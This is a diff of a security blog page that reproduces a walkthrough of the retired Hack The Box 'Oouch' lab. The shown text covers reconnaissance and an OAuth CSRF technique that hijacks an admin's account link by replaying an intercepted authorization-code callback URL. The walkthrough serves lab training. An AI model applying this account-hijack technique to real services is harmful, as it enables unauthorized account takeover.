@@ -4,7 +4,7 @@
 1e:I[484,[],"OutletBoundary"]
 1f:"$Sreact.suspense"
 :HL["/writing/covers/hackthebox-oouch-walkthrough.webp","image"]
-0:{"rsc":["$","$1","c",{"children":[[[["$","a",null,{"className":"skip-link","href":"#main-content","children":"Skip to content"}],["$","header",null,{"className":"site-header","children":["$","div",null,{"className":"shell header-inner","children":[["$","$L2",null,{"className":"brand","href":"/","aria-label":"CyberKareem home","children":[["$","span",null,{"className":"brand-mark","aria-hidden":"true","children":"CK"}],["$","span",null,{"children":"CyberKareem"}]]}],["$","nav",null,{"className":"desktop-nav","aria-label":"Primary navigation","children":[["$","$L2","/research",{"href":"/research","children":"Research"}],["$","$L2","/services",{"href":"/services","children":"Services"}],["$","$L2","/writing",{"href":"/writing","aria-current":"page","children":"Writing"}],["$","$L2","/projects",{"href":"/projects","children":"Projects"}],["$","$L2","/about",{"href":"/about","children":"About"}],["$","$L2","/contact",{"href":"/contact","children":"Contact"}]]}],["$","$L2",null,{"className":"utility-link","href":"/contact#assessment-enquiries","children":["Start an assessment ",["$","span",null,{"aria-hidden":"true","children":"→"}]]}],["$","$L3",null,{"items":[{"label":"Research","href":"/research"},{"label":"Services","href":"/services"},{"label":"Writing","href":"/writing"},{"label":"Projects","href":"/projects"},{"label":"About","href":"/about"},{"label":"Contact","href":"/contact"}],"activePath":"/writing"}]]}]}]],["$","main",null,{"id":"main-content","tabIndex":-1,"className":"article-main","children":[["$","article",null,{"className":"writing-article","children":[["$","header",null,{"className":"article-hero shell","children":[["$","nav",null,{"className":"article-breadcrumb","aria-label":"Breadcrumb","children":[["$","$L2",null,{"href":"/writing","children":"Writing archive"}],["$","span",null,{"aria-hidden":"true","children":"/"}],["$","span",null,{"children":"Hack The Box"}]]}],["$","p",null,{"className":"page-eyebrow","children":"Hack The Box"}],["$","h1",null,{"children":"Hack The Box: Oouch Walkthrough"}],["$","p",null,{"className":"article-dek","children":"An archived walkthrough of the retired Hack The Box Oouch machine, preserved from Abdullah Kareem's OSWE Prep preparation notes."}],["$","dl",null,{"className":"article-meta","children":[["$","div",null,{"children":[["$","dt",null,{"children":"Published"}],["$","dd",null,{"children":["$","time",null,{"dateTime":"2026-06-11T12:26:26.000Z","children":"11 Jun 2026"}]}]]}],["$","div",null,{"children":[["$","dt",null,{"children":"Reading time"}],["$","dd",null,{"children":[20," minutes"]}]]}],null,["$","div",null,{"children":[["$","dt",null,{"children":"Author"}],["$","dd",null,{"children":"Abdullah Kareem"}]]}]]}],["$","figure",null,{"className":"article-cover article-cover-machine","children":[["$","div",null,{"className":"article-cover-art","children":["$","img",null,{"src":"/writing/covers/hackthebox-oouch-walkthrough.webp","width":300,"height":300,"alt":"Hack The Box Oouch machine avatar","decoding":"async"}]}],["$","figcaption",null,{"children":[["$","span",null,{"children":"Official Oouch machine artwork, used for identification. Hack The Box is not affiliated with this archive."}],["$","a",null,{"href":"https://app.hackthebox.com/machines/oouch","target":"_blank","rel":"nofollow noopener noreferrer","children":["Hack The Box machine artwork"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}]]}]]}]]}]]}],["$","div",null,{"className":"article-rule"}],["$","div",null,{"className":"article-layout shell","children":[["$","aside",null,{"className":"article-context","aria-label":"Article provenance and review context","children":[[["$","nav",null,{"className":"article-toc article-toc-desktop","aria-label":"Article sections","children":[["$","span",null,{"children":"On this page"}],["$","ol",null,{"children":[["$","li","philosophy-the-hacker-mindset-for-this-box",{"children":["$","a",null,{"href":"#philosophy-the-hacker-mindset-for-this-box","children":"Philosophy: The Hacker Mindset for This Box"}]}],["$","li","initial-reconnaissance",{"children":["$","a",null,{"href":"#initial-reconnaissance","children":"Initial Reconnaissance"}]}],["$","li","understanding-the-oauth2-architecture",{"children":["$","a",null,{"href":"#understanding-the-oauth2-architecture","children":"Understanding the OAuth2 Architecture"}]}],["$","li","step-1-account-registration-on-both-services",{"children":["$","a",null,{"href":"#step-1-account-registration-on-both-services","children":"Step 1: Account Registration on Both Services"}]}],["$","li","step-2-csrf-1-hijacking-the-admin-account-on-the-consumer",{"children":"$L4"}],"$L5","$L6","$L7","$L8","$L9","$La","$Lb","$Lc","$Ld","$Le","$Lf","$L10"]}]]}],"$L11"],"$L12","$L13",["$L14","$L15","$L16"]]}],"$L17"]}]]}],"$L18"]}],"$L19","$L1a"],null,"$L1b"]}],"isPartial":false,"staleTime":300,"varyParams":null,"buildId":"zs2c_HJI2CXWwLDIPVraL"}
+0:{"rsc":["$","$1","c",{"children":[[[["$","a",null,{"className":"skip-link","href":"#main-content","children":"Skip to content"}],["$","header",null,{"className":"site-header","children":["$","div",null,{"className":"shell header-inner","children":[["$","$L2",null,{"className":"brand","href":"/","aria-label":"CyberKareem home","children":[["$","span",null,{"className":"brand-mark","aria-hidden":"true","children":"CK"}],["$","span",null,{"children":"CyberKareem"}]]}],["$","nav",null,{"className":"desktop-nav","aria-label":"Primary navigation","children":[["$","$L2","/research",{"href":"/research","children":"Research"}],["$","$L2","/services",{"href":"/services","children":"Services"}],["$","$L2","/writing",{"href":"/writing","aria-current":"page","children":"Writing"}],["$","$L2","/projects",{"href":"/projects","children":"Projects"}],["$","$L2","/about",{"href":"/about","children":"About"}],["$","$L2","/contact",{"href":"/contact","children":"Contact"}]]}],["$","$L2",null,{"className":"utility-link","href":"/contact#assessment-enquiries","children":["Start an assessment ",["$","span",null,{"aria-hidden":"true","children":"→"}]]}],["$","$L3",null,{"items":[{"label":"Research","href":"/research"},{"label":"Services","href":"/services"},{"label":"Writing","href":"/writing"},{"label":"Projects","href":"/projects"},{"label":"About","href":"/about"},{"label":"Contact","href":"/contact"}],"activePath":"/writing"}]]}]}]],["$","main",null,{"id":"main-content","tabIndex":-1,"className":"article-main","children":[["$","article",null,{"className":"writing-article","children":[["$","header",null,{"className":"article-hero shell","children":[["$","nav",null,{"className":"article-breadcrumb","aria-label":"Breadcrumb","children":[["$","$L2",null,{"href":"/writing","children":"Writing archive"}],["$","span",null,{"aria-hidden":"true","children":"/"}],["$","span",null,{"children":"Hack The Box"}]]}],["$","p",null,{"className":"page-eyebrow","children":"Hack The Box"}],["$","h1",null,{"children":"Hack The Box: Oouch Walkthrough"}],["$","p",null,{"className":"article-dek","children":"Two OAuth CSRF flaws hijacked the consumer admin and stole an authorization code for qtc's SSH key, then a world-writable uWSGI socket pivoted into the consumer container and DBus command injection executed as root."}],["$","dl",null,{"className":"article-meta","children":[["$","div",null,{"children":[["$","dt",null,{"children":"Published"}],["$","dd",null,{"children":["$","time",null,{"dateTime":"2026-06-11T12:26:26.000Z","children":"11 Jun 2026"}]}]]}],["$","div",null,{"children":[["$","dt",null,{"children":"Reading time"}],["$","dd",null,{"children":[15," minutes"]}]]}],null,["$","div",null,{"children":[["$","dt",null,{"children":"Author"}],["$","dd",null,{"children":"Abdullah Kareem"}]]}]]}],["$","figure",null,{"className":"article-cover article-cover-machine","children":[["$","div",null,{"className":"article-cover-art","children":["$","img",null,{"src":"/writing/covers/hackthebox-oouch-walkthrough.webp","width":300,"height":300,"alt":"Hack The Box Oouch machine avatar","decoding":"async"}]}],["$","figcaption",null,{"children":[["$","span",null,{"children":"Official Oouch machine artwork, used for identification. Hack The Box is not affiliated with this archive."}],["$","a",null,{"href":"https://app.hackthebox.com/machines/oouch","target":"_blank","rel":"nofollow noopener noreferrer","children":"Hack The Box machine artwork"}]]}]]}]]}],["$","div",null,{"className":"article-rule"}],["$","div",null,{"className":"article-layout shell","children":[["$","aside",null,{"className":"article-context","aria-label":"Article provenance and review context","children":[[["$","nav",null,{"className":"article-toc article-toc-desktop","aria-label":"Article sections","children":[["$","span",null,{"children":"On this page"}],["$","ol",null,{"children":[["$","li","approach-for-this-box",{"children":["$","a",null,{"href":"#approach-for-this-box","children":"Approach for This Box"}]}],["$","li","initial-reconnaissance",{"children":["$","a",null,{"href":"#initial-reconnaissance","children":"Initial Reconnaissance"}]}],["$","li","understanding-the-oauth2-architecture",{"children":["$","a",null,{"href":"#understanding-the-oauth2-architecture","children":"Understanding the OAuth2 Architecture"}]}],["$","li","step-1-account-registration-on-both-services",{"children":["$","a",null,{"href":"#step-1-account-registration-on-both-services","children":"Step 1: Account Registration on Both Services"}]}],["$","li","step-2-csrf-1-hijacking-the-admin-account-on-the-consumer",{"children":"$L4"}],"$L5","$L6","$L7","$L8","$L9","$La","$Lb","$Lc","$Ld","$Le","$Lf","$L10"]}]]}],"$L11"],"$L12","$L13",["$L14","$L15","$L16"]]}],"$L17"]}]]}],"$L18"]}],"$L19","$L1a"],null,"$L1b"]}],"isPartial":false,"staleTime":300,"varyParams":null,"buildId":"EBRi0HxexS1XMGpfUl_9d"}
 4:["$","a",null,{"href":"#step-2-csrf-1-hijacking-the-admin-account-on-the-consumer","children":"Step 2: CSRF #1 - Hijacking the Admin Account on the Consumer"}]
 5:["$","li","step-3-escalation-to-qtc-and-document-discovery",{"children":["$","a",null,{"href":"#step-3-escalation-to-qtc-and-document-discovery","children":"Step 3: Escalation to qtc and Document Discovery"}]}]
 6:["$","li","step-4-registering-a-malicious-oauth-application",{"children":["$","a",null,{"href":"#step-4-registering-a-malicious-oauth-application","children":"Step 4: Registering a Malicious OAuth Application"}]}]
@@ -17,25 +17,24 @@ c:["$","li","step-10-pivoting-into-the-consumer-container",{"children":["$","a",
 d:["$","li","step-11-exploiting-uwsgi-for-www-data",{"children":["$","a",null,{"href":"#step-11-exploiting-uwsgi-for-www-data","children":"Step 11: Exploiting uWSGI for www-data"}]}]
 e:["$","li","step-12-dbus-command-injection-to-root",{"children":["$","a",null,{"href":"#step-12-dbus-command-injection-to-root","children":"Step 12: DBus Command Injection to Root"}]}]
 f:["$","li","step-13-root-flag",{"children":["$","a",null,{"href":"#step-13-root-flag","children":"Step 13: Root Flag"}]}]
-10:["$","li","key-takeaways",{"children":["$","a",null,{"href":"#key-takeaways","children":"Key Takeaways"}]}]
-11:["$","details",null,{"className":"article-toc article-toc-mobile","children":[["$","summary",null,{"children":["On this page · ",17," sections"]}],["$","nav",null,{"aria-label":"Article sections","children":["$","ol",null,{"children":[["$","li","philosophy-the-hacker-mindset-for-this-box",{"children":["$","a",null,{"href":"#philosophy-the-hacker-mindset-for-this-box","children":"Philosophy: The Hacker Mindset for This Box"}]}],["$","li","initial-reconnaissance",{"children":["$","a",null,{"href":"#initial-reconnaissance","children":"Initial Reconnaissance"}]}],["$","li","understanding-the-oauth2-architecture",{"children":["$","a",null,{"href":"#understanding-the-oauth2-architecture","children":"Understanding the OAuth2 Architecture"}]}],["$","li","step-1-account-registration-on-both-services",{"children":["$","a",null,{"href":"#step-1-account-registration-on-both-services","children":"Step 1: Account Registration on Both Services"}]}],["$","li","step-2-csrf-1-hijacking-the-admin-account-on-the-consumer",{"children":["$","a",null,{"href":"#step-2-csrf-1-hijacking-the-admin-account-on-the-consumer","children":"Step 2: CSRF #1 - Hijacking the Admin Account on the Consumer"}]}],["$","li","step-3-escalation-to-qtc-and-document-discovery",{"children":["$","a",null,{"href":"#step-3-escalation-to-qtc-and-document-discovery","children":"Step 3: Escalation to qtc and Document Discovery"}]}],["$","li","step-4-registering-a-malicious-oauth-application",{"children":["$","a",null,{"href":"#step-4-registering-a-malicious-oauth-application","children":"Step 4: Registering a Malicious OAuth Application"}]}],["$","li","step-5-csrf-2-stealing-the-admin-s-authorization-code",{"children":["$","a",null,{"href":"#step-5-csrf-2-stealing-the-admin-s-authorization-code","children":"Step 5: CSRF #2 - Stealing the Admin's Authorization Code"}]}],["$","li","step-6-exchanging-the-code-for-an-access-token",{"children":["$","a",null,{"href":"#step-6-exchanging-the-code-for-an-access-token","children":"Step 6: Exchanging the Code for an Access Token"}]}],["$","li","step-7-retrieving-the-ssh-key",{"children":["$","a",null,{"href":"#step-7-retrieving-the-ssh-key","children":"Step 7: Retrieving the SSH Key"}]}],["$","li","step-8-user-flag",{"children":["$","a",null,{"href":"#step-8-user-flag","children":"Step 8: User Flag"}]}],["$","li","step-9-post-user-enumeration-discovering-docker-containers",{"children":["$","a",null,{"href":"#step-9-post-user-enumeration-discovering-docker-containers","children":"Step 9: Post-User Enumeration - Discovering Docker Containers"}]}],["$","li","step-10-pivoting-into-the-consumer-container",{"children":["$","a",null,{"href":"#step-10-pivoting-into-the-consumer-container","children":"Step 10: Pivoting into the Consumer Container"}]}],["$","li","step-11-exploiting-uwsgi-for-www-data",{"children":["$","a",null,{"href":"#step-11-exploiting-uwsgi-for-www-data","children":"Step 11: Exploiting uWSGI for www-data"}]}],["$","li","step-12-dbus-command-injection-to-root",{"children":["$","a",null,{"href":"#step-12-dbus-command-injection-to-root","children":"Step 12: DBus Command Injection to Root"}]}],["$","li","step-13-root-flag",{"children":["$","a",null,{"href":"#step-13-root-flag","children":"Step 13: Root Flag"}]}],["$","li","key-takeaways",{"children":["$","a",null,{"href":"#key-takeaways","children":"Key Takeaways"}]}]]}]}]]}]
-12:["$","div",null,{"className":"article-provenance","children":[["$","span",null,{"children":"Archive provenance"}],[["$","p",null,{"children":["Archived from public GitHub preparation notes"," on ","11 Jun 2026",". Added to CyberKareem on ","12 Jul 2026","."]}],["$","a",null,{"href":"https://github.com/CyberKareem/OSWE-Prep/blob/6df034e923113b53b84732922f116c97a8bc9482/HTB-Oouch.md","target":"_blank","rel":"nofollow noopener noreferrer","children":["Immutable source revision ",["$","span",null,{"aria-hidden":"true","children":"↗"}]]}],["$","small",null,{"children":["CyberKareem/OSWE-Prep"," · 6df034e92311",""]}]]]}]
-13:["$","div",null,{"className":"article-review-note article-review-lab-archive","children":[["$","span",null,{"children":"Official machine record"}],["$","p",null,{"children":["Oouch"," · Linux"," · Hard"," · Retired status verified 12 Jul 2026","."]}],["$","a",null,{"href":"https://app.hackthebox.com/machines/oouch","target":"_blank","rel":"nofollow noopener noreferrer","children":["Open Hack The Box profile ",["$","span",null,{"aria-hidden":"true","children":"↗"}]]}]]}]
+10:["$","li","review-notes",{"children":["$","a",null,{"href":"#review-notes","children":"Review notes"}]}]
+11:["$","details",null,{"className":"article-toc article-toc-mobile","children":[["$","summary",null,{"children":["On this page (",17," sections)"]}],["$","nav",null,{"aria-label":"Article sections","children":["$","ol",null,{"children":[["$","li","approach-for-this-box",{"children":["$","a",null,{"href":"#approach-for-this-box","children":"Approach for This Box"}]}],["$","li","initial-reconnaissance",{"children":["$","a",null,{"href":"#initial-reconnaissance","children":"Initial Reconnaissance"}]}],["$","li","understanding-the-oauth2-architecture",{"children":["$","a",null,{"href":"#understanding-the-oauth2-architecture","children":"Understanding the OAuth2 Architecture"}]}],["$","li","step-1-account-registration-on-both-services",{"children":["$","a",null,{"href":"#step-1-account-registration-on-both-services","children":"Step 1: Account Registration on Both Services"}]}],["$","li","step-2-csrf-1-hijacking-the-admin-account-on-the-consumer",{"children":["$","a",null,{"href":"#step-2-csrf-1-hijacking-the-admin-account-on-the-consumer","children":"Step 2: CSRF #1 - Hijacking the Admin Account on the Consumer"}]}],["$","li","step-3-escalation-to-qtc-and-document-discovery",{"children":["$","a",null,{"href":"#step-3-escalation-to-qtc-and-document-discovery","children":"Step 3: Escalation to qtc and Document Discovery"}]}],["$","li","step-4-registering-a-malicious-oauth-application",{"children":["$","a",null,{"href":"#step-4-registering-a-malicious-oauth-application","children":"Step 4: Registering a Malicious OAuth Application"}]}],["$","li","step-5-csrf-2-stealing-the-admin-s-authorization-code",{"children":["$","a",null,{"href":"#step-5-csrf-2-stealing-the-admin-s-authorization-code","children":"Step 5: CSRF #2 - Stealing the Admin's Authorization Code"}]}],["$","li","step-6-exchanging-the-code-for-an-access-token",{"children":["$","a",null,{"href":"#step-6-exchanging-the-code-for-an-access-token","children":"Step 6: Exchanging the Code for an Access Token"}]}],["$","li","step-7-retrieving-the-ssh-key",{"children":["$","a",null,{"href":"#step-7-retrieving-the-ssh-key","children":"Step 7: Retrieving the SSH Key"}]}],["$","li","step-8-user-flag",{"children":["$","a",null,{"href":"#step-8-user-flag","children":"Step 8: User Flag"}]}],["$","li","step-9-post-user-enumeration-discovering-docker-containers",{"children":["$","a",null,{"href":"#step-9-post-user-enumeration-discovering-docker-containers","children":"Step 9: Post-User Enumeration - Discovering Docker Containers"}]}],["$","li","step-10-pivoting-into-the-consumer-container",{"children":["$","a",null,{"href":"#step-10-pivoting-into-the-consumer-container","children":"Step 10: Pivoting into the Consumer Container"}]}],["$","li","step-11-exploiting-uwsgi-for-www-data",{"children":["$","a",null,{"href":"#step-11-exploiting-uwsgi-for-www-data","children":"Step 11: Exploiting uWSGI for www-data"}]}],["$","li","step-12-dbus-command-injection-to-root",{"children":["$","a",null,{"href":"#step-12-dbus-command-injection-to-root","children":"Step 12: DBus Command Injection to Root"}]}],["$","li","step-13-root-flag",{"children":["$","a",null,{"href":"#step-13-root-flag","children":"Step 13: Root Flag"}]}],["$","li","review-notes",{"children":["$","a",null,{"href":"#review-notes","children":"Review notes"}]}]]}]}]]}]
+12:["$","div",null,{"className":"article-provenance","children":[["$","span",null,{"children":"Source"}],[["$","p",null,{"children":["Archived from public GitHub preparation notes on ","11 Jun 2026",". Added to CyberKareem on ","12 Jul 2026","."]}],["$","a",null,{"href":"https://github.com/CyberKareem/OSWE-Prep/blob/6df034e923113b53b84732922f116c97a8bc9482/HTB-Oouch.md","target":"_blank","rel":"nofollow noopener noreferrer","children":"Immutable source revision"}],["$","small",null,{"children":["CyberKareem/OSWE-Prep",", commit 6df034e92311",""]}]]]}]
+13:["$","div",null,{"className":"article-review-note article-review-lab-archive","children":[["$","span",null,{"children":"Official machine record"}],["$","p",null,{"children":["Oouch, Linux, Hard",". Retired status verified ","12 Jul 2026","."]}],["$","a",null,{"href":"https://app.hackthebox.com/machines/oouch","target":"_blank","rel":"nofollow noopener noreferrer","children":"Open Hack The Box profile"}]]}]
 14:["$","div","lab-archive-0",{"className":"article-review-note article-review-lab-archive","children":[["$","span",null,{"children":"Archived, authorized retired-lab walkthrough"}],["$","p",null,{"children":"This personal lab note documents the officially retired Hack The Box Oouch machine. Retired status was verified on 12 July 2026. Use the techniques only on systems you own or have explicit permission to test."}],null]}]
-15:["$","div","source-context-1",{"className":"article-review-note article-review-source-context","children":[["$","span",null,{"children":"GitHub archive context"}],["$","p",null,{"children":"Imported mechanically from Abdullah Kareem's public preparation notes. Commands and claims reflect the archived lab and tool versions; this page does not add new solution steps or imply Hack The Box endorsement."}],null]}]
-16:["$","div","editorial-correction-2",{"className":"article-review-note article-review-editorial-correction","children":[["$","span",null,{"children":"Reusable artifacts removed"}],["$","p",null,{"children":"7 redacted retired-lab artifact occurrences were replaced with descriptive placeholders while preserving the attack method, including credentials, keys, tickets, hashes, flags, private links, or encoded material."}],null]}]
-1c:T9252,
-<p><strong>Target IP:</strong> <code>10.129.29.195</code><br /><strong>Attacker IP:</strong> <code>10.10.14.6</code><br /><strong>Difficulty:</strong> Hard<br /><strong>Category:</strong> Linux / OAuth2 / CSRF / Docker Escape / DBus Command Injection</p>
-<hr />
+15:["$","div","source-context-1",{"className":"article-review-note article-review-source-context","children":[["$","span",null,{"children":"GitHub archive context"}],["$","p",null,{"children":"Imported from Abdullah Kareem's public preparation notes and lightly copy-edited for clarity. Commands and technical claims remain tied to the archived lab and tool versions; this page does not add new solution steps or imply Hack The Box endorsement."}],null]}]
+16:["$","div","editorial-correction-2",{"className":"article-review-note article-review-editorial-correction","children":[["$","span",null,{"children":"Reusable artifacts removed"}],["$","p",null,{"children":"4 redacted retired-lab artifact occurrences were replaced with descriptive placeholders while preserving the attack method, including credentials, keys, tickets, hashes, flags, private links, or encoded material."}],null]}]
+1c:T7419,<p><strong>Target IP:</strong> <code>10.129.29.195</code><br><strong>Attacker IP:</strong> <code>10.10.14.6</code><br><strong>Difficulty:</strong> Hard<br><strong>Category:</strong> Linux / OAuth2 / CSRF / Docker Escape / DBus Command Injection</p>
+<hr>
 
 
 
-<h2 id="philosophy-the-hacker-mindset-for-this-box">Philosophy: The Hacker Mindset for This Box</h2>
-<p>Before we touch a single command, let's understand <strong>why</strong> this box exists and what mental models you need.</p>
+<h2 id="approach-for-this-box">Approach for This Box</h2>
+<p>Start with the OAuth trust flow and the role of each participant.</p>
 <p><strong>Oouch is an OAuth2 teaching machine.</strong> The creator (<code>qtc</code>) built it to demonstrate that even "secure" modern authentication protocols can be completely compromised by missing a single CSRF token or by trusting user input in a backend service.</p>
-<h3 id="the-hacker-mindset-you-need-here">The Hacker Mindset You Need Here:</h3>
+
 <ol>
-<li><p><strong>Think in flows, not pages.</strong> OAuth2 is REDACTED a single webpage you can attack in isolation. It's a <em>conversation</em> between three parties: the consumer app, the authorization server, and the user (or admin bot). Your goal is to find the weakest link in that conversation.</p>
+<li><p><strong>Think in flows, not pages.</strong> OAuth2 is not a single webpage you can attack in isolation. It's a <em>conversation</em> between three parties: the consumer app, the authorization server, and the user (or admin bot). Your goal is to find the weakest link in that conversation.</p>
 </li>
 <li><p><strong>Trust boundaries are everything.</strong> The consumer app trusts the authorization server. The authorization server trusts the user's browser. The admin bot trusts the contact form. Every time you see trust, ask: <em>"What if I insert myself into this trust relationship?"</em></p>
 </li>
@@ -43,10 +42,10 @@ f:["$","li","step-13-root-flag",{"children":["$","a",null,{"href":"#step-13-root
 </li>
 <li><p><strong>Containers are not magic security.</strong> Docker separates processes, but if a container can talk to a host service (like DBus) and that service runs as root and trusts input from the container... the container boundary collapses.</p>
 </li>
-<li><p><strong>Sockets are files, and files have permissions.</strong> The uWSGI socket was world-writable (<code>srw-rw-rw-</code>). That means <em>any</em> user on the system — even inside a container — can write to it and impersonate the web server.</p>
+<li><p><strong>Sockets are files, and files have permissions.</strong> The uWSGI socket was world-writable (<code>srw-rw-rw-</code>). That means <em>any</em> user on the system - even inside a container - can write to it and impersonate the web server.</p>
 </li>
 </ol>
-<hr />
+<hr>
 <h2 id="initial-reconnaissance">Initial Reconnaissance</h2>
 <h3 id="why-recon-matters">Why Recon Matters</h3>
 <p>You cannot attack what you do not understand. Before we exploit anything, we need to know:</p>
@@ -58,8 +57,8 @@ f:["$","li","step-13-root-flag",{"children":["$","a",null,{"href":"#step-13-root
 <h3 id="step-0-1-port-scan">Step 0.1: Port Scan</h3>
 <pre><code class="language-bash" data-language="bash">nmap -p- -sC -sV 10.129.29.195
 </code></pre>
-<p><strong>What this does:</strong><br /><code>-p-</code> scans all 65,535 TCP ports. <code>-sC</code> runs default NSE scripts. <code>-sV</code> performs version detection.</p>
-<p><strong>Why we do this:</strong><br />We want the full attack surface. A "quick" scan might miss non-standard ports. Oouch runs HTTP on 5000 and 8000 — both non-standard.</p>
+<p><strong>What this does:</strong><br><code>-p-</code> scans all 65,535 TCP ports. <code>-sC</code> runs default NSE scripts. <code>-sV</code> performs version detection.</p>
+<p><strong>Reason:</strong><br>We want the full attack surface. A "quick" scan might miss non-standard ports. Oouch runs HTTP on 5000 and 8000 - both non-standard.</p>
 <p><strong>Expected output:</strong></p>
 <pre><code>PORT     STATE SERVICE VERSION
 21/tcp   open  ftp     vsftpd 2.0.8 or later
@@ -67,10 +66,8 @@ f:["$","li","step-13-root-flag",{"children":["$","a",null,{"href":"#step-13-root
 5000/tcp open  http    nginx 1.14.2
 8000/tcp open  rtsp
 </code></pre>
-<p><strong>Hacker Mindset:</strong>  </p>
-<blockquote>
-<p>"Four ports. FTP might have anonymous access. SSH is probably key-only. Two HTTP ports means two applications. The machine name is 'Oouch' — that sounds like 'Ouch' or maybe 'OAuth'? Let's keep that hypothesis in mind."</p>
-</blockquote>
+
+
 <h3 id="step-0-2-anonymous-ftp">Step 0.2: Anonymous FTP</h3>
 <pre><code class="language-bash" data-language="bash">ftp 10.129.29.195
 </code></pre>
@@ -79,26 +76,22 @@ f:["$","li","step-13-root-flag",{"children":["$","a",null,{"href":"#step-13-root
 get project.txt
 quit
 </code></pre>
-<p><strong>What this does:</strong><br />Many FTP servers allow anonymous logins for public file distribution. Developers sometimes leave hints or files here.</p>
-<p><strong>Why we do this:</strong><br />It's the lowest-hanging fruit. If we can get files without credentials, we should do it immediately.</p>
+<p><strong>What this does:</strong><br>Many FTP servers allow anonymous logins for public file distribution. Developers sometimes leave hints or files here.</p>
+<p><strong>Reason:</strong><br>It's the lowest-hanging fruit. If we can get files without credentials, we should do it immediately.</p>
 <p><strong>Content of <code>project.txt</code>:</strong></p>
 <pre><code>Flask -&gt; Consumer
 Django -&gt; Authorization Server
 </code></pre>
-<p><strong>Hacker Mindset:</strong>  </p>
-<blockquote>
-<p>"Flask is a Python micro-framework. Django is a Python web framework. The terms 'Consumer' and 'Authorization Server' are OAuth2 terminology. This confirms our hypothesis: this box is about OAuth2. Port 5000 is probably Flask (consumer app). Port 8000 is probably Django (auth server)."</p>
-</blockquote>
+
+
 <h3 id="step-0-3-adding-hosts-to-etc-hosts">Step 0.3: Adding Hosts to /etc/hosts</h3>
 <pre><code class="language-bash" data-language="bash">echo "10.129.29.195 oouch.htb consumer.oouch.htb authorization.oouch.htb" | sudo tee -a /etc/hosts
 </code></pre>
-<p><strong>What this does:</strong><br />Web applications often use virtual hosts (vhosts) to serve different content based on the <code>Host</code> header. Without these DNS entries, your browser won't know where to send requests for those hostnames.</p>
-<p><strong>Why we do this:</strong><br />When we eventually see redirects to <code>consumer.oouch.htb</code> or <code>authorization.oouch.htb</code>, our system needs to resolve them. If we skip this, we'll get connection errors later and waste time debugging.</p>
-<p><strong>Hacker Mindset:</strong>  </p>
-<blockquote>
-<p>"The application is telling me its own name. I need to make sure my system speaks the same language. OAuth2 relies heavily on redirects between domains. If I can't resolve those domains, I can't follow the authentication flow."</p>
-</blockquote>
-<hr />
+<p><strong>What this does:</strong><br>Web applications often use virtual hosts (vhosts) to serve different content based on the <code>Host</code> header. Without these DNS entries, your browser won't know where to send requests for those hostnames.</p>
+<p><strong>Reason:</strong><br>When we eventually see redirects to <code>consumer.oouch.htb</code> or <code>authorization.oouch.htb</code>, our system needs to resolve them. If we skip this, we'll get connection errors later and waste time debugging.</p>
+
+
+<hr>
 <h2 id="understanding-the-oauth2-architecture">Understanding the OAuth2 Architecture</h2>
 <p>Before attacking, we need to understand the three actors:</p>
 <h3 id="1-the-consumer-application-flask-port-5000">1. The Consumer Application (Flask, port 5000)</h3>
@@ -117,7 +110,7 @@ Django -&gt; Authorization Server
 <li>Consumer uses <code>access_token</code> to query user data from the resource server.</li>
 </ol>
 <p><strong>The attack surface lives in steps 3-4.</strong> If the auth server doesn't validate CSRF tokens, we can skip the "Authorize" button step. If the consumer doesn't validate a <code>state</code> parameter, we can trick users into linking their accounts to our OAuth account.</p>
-<hr />
+<hr>
 <h2 id="step-1-account-registration-on-both-services">Step 1: Account Registration on Both Services</h2>
 <h3 id="consumer-app-port-5000">Consumer App (Port 5000)</h3>
 <p>Visit: <code>http://consumer.oouch.htb:5000/register</code></p>
@@ -130,25 +123,21 @@ Django -&gt; Authorization Server
 <ul>
 <li><code>/documents</code> says "administrators only."</li>
 <li><code>/contact</code> has a form that says messages are forwarded to the system administrator.</li>
-<li><code>/profile</code> shows "Connected Accounts" — currently none.</li>
+<li><code>/profile</code> shows "Connected Accounts" - currently none.</li>
 <li><code>/oauth</code> exists (found via Gobuster or linked from profile).</li>
 </ul>
-<p><strong>Hacker Mindset:</strong>  </p>
-<blockquote>
-<p>"There's an admin account. I can't access <code>/documents</code>. The contact form talks to an admin bot. The OAuth page lets me connect accounts. This is a setup for a CSRF attack: I need to make the admin bot perform an action on my behalf."</p>
-</blockquote>
+
+
 <h3 id="authorization-server-port-8000">Authorization Server (Port 8000)</h3>
 <p>Visit: <code>http://authorization.oouch.htb:8000/signup/</code></p>
 <ul>
 <li>Register a username like <code>testauth</code> with a password.</li>
 <li>Log in.</li>
-<li>Note the SSH fields during registration — these will be important later.</li>
+<li>Note the SSH fields during registration - these will be important later.</li>
 </ul>
-<p><strong>Hacker Mindset:</strong>  </p>
-<blockquote>
-<p>"The auth server asks for SSH information during signup. OAuth2 consumers can request user data via APIs. If I can get an access token for an admin, I might be able to retrieve their SSH key through an API endpoint. I'm already thinking ahead to the user-shell phase."</p>
-</blockquote>
-<hr />
+
+
+<hr>
 <h2 id="step-2-csrf-1-hijacking-the-admin-account-on-the-consumer">Step 2: CSRF #1 - Hijacking the Admin Account on the Consumer</h2>
 <h3 id="the-vulnerability">The Vulnerability</h3>
 <p>When you click "Connect Account" on the consumer, it redirects to the auth server. After you authorize, the auth server redirects back to:</p>
@@ -163,30 +152,26 @@ Django -&gt; Authorization Server
 <li>Visit <code>http://consumer.oouch.htb:5000/oauth/connect</code>.</li>
 <li>Forward requests until you see the authorize page on the auth server.</li>
 <li>Click "Authorize" on the auth server page.</li>
-<li>In your proxy, you'll see a POST to <code>/oauth/authorize/...</code> — forward it.</li>
+<li>In your proxy, you'll see a POST to <code>/oauth/authorize/...</code> : forward it.</li>
 <li>The <strong>next</strong> request is the critical one:<pre><code>GET /oauth/connect/token?code=3swBqy03xWYONlt2T5Rh54jjDhglAY HTTP/1.1
 Host: consumer.oouch.htb:5000
 </code></pre>
 <strong>DROP this request.</strong> Do not let it reach the server.
 <strong>Copy the full URL.</strong></li>
 </ol>
-<p><strong>Why we drop it:</strong><br />If we let this request complete, <em>our</em> <code>testuser</code> account will be linked to our <code>testauth</code> account. That's useless. We want the admin bot to send this request instead, so the admin's account gets linked to our OAuth account.</p>
-<p><strong>Hacker Mindset:</strong>  </p>
-<blockquote>
-<p>"I'm not the target — the admin is. I need to steal this callback URL and feed it to the admin bot. This is like intercepting a package and re-routing it to a different recipient. The package (the authorization code) is tied to my OAuth account, but the recipient (the consumer session) needs to be the admin's."</p>
-</blockquote>
